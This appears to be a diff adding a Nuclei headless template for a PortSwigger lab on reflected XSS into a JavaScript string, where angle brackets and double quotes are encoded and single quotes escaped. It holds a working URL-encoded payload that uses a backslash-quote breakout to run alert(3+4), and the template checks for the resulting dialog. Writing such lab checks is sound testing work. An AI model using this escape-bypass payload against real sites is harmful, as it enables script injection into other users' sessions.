@@ -1,0 +1,28 @@
+# run with flag $ nuclei -headless
+
+id: lab-javascript-string-angle-brackets-double-quotes
+
+info:
+  name: xss_lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped
+  author: FIR_UIII
+  severity: high
+  description: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+  tags: XSS,portswigger
+
+headless:
+  - steps:
+      - args:
+          url: "{{BaseURL}}/?search=%5C%27-alert%283%2B4%29%2F%2F"
+        action: navigate
+
+      - action: waitdialog
+        name: reflected_topicId_query
+
+    matchers-condition: and
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - reflected_topicId_query == true
+          - reflected_topicId_query_message == "7" # 3+4
+        condition: and
